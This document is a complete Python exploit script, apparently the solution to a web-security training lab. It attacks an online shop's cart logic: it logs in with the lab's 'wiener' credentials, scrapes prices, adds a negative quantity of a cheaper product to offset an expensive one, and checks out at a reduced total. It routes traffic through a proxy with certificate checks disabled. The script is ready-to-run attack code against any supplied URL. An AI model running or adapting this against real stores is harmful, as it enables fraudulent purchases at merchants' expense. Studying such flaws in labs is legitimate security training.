import requests
import sys
import re
import urllib3
import random
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def get_csrf_token(session, url) :
    res = session.get(url, proxies=proxies, verify=False)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf_token = soup.find('input', {'name':'csrf'})['value']
    if csrf_token :    
        return csrf_token
    return None
    
def business_logic_exploit(session, url) :
    
    response = session.get(url, verify=False, proxies=proxies)
    
    # Use regex to find all prices and corresponding productId
    pattern = r'\$(\d+\.\d{2})[\s\S]*?productId=(\d+)'

    matches = re.findall(pattern, response.text)

    # Extracted prices and corresponding productId pairs
    price_product_pairs = {float(match[0]): int(match[1]) for match in matches}
    
    max_key = max(price_product_pairs.keys())
    second_item = max_key
    
    while second_item == max_key :
        second_item = random.choice(list(price_product_pairs.keys()))
 
    factor = int(max_key / second_item)

    # get the csrf token here
    login_url = url + '/login'
    csrf_token = get_csrf_token(session, login_url)
    data = {'csrf':csrf_token, 'username':'wiener', 'password':'peter'}
    
    # logging wiht the wiener user here
    res = session.post(login_url, data=data, proxies=proxies, verify=False)
    
    if "Log out" in res.text :
        print("The wiener user has logged in successfully !!")
        
        # Add the wanted product
        add_item_url = url + '/cart'
        data = {'productId': price_product_pairs[max_key], 'redir':'PRODUCT', 'quantity':'1'}
        session.post(add_item_url, data=data, proxies=proxies, verify=False)
        
        # (1 - 2)*price = -(price)
        data = {'productId':price_product_pairs[second_item], 'redir':'PRODUCT', 'quantity': -factor}
        session.post(add_item_url, data=data, proxies=proxies, verify=False)
        
        # Buying the item
        csrf_token = get_csrf_token(session, add_item_url)
        data = {'csrf':csrf_token}
        checkout_url = url + '/cart/checkout'
        r = session.post(checkout_url, data=data, proxies=proxies, verify=False)
        
        if "Congratulations" in r.text :
            print("The business logic vulnerability has been successfully exploit!")
        else :
            print("Failed to exploit the business logic vulnerability!")


if __name__ == "__main__" :
    try :
        url = sys.argv[1]
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    business_logic_exploit(session, url)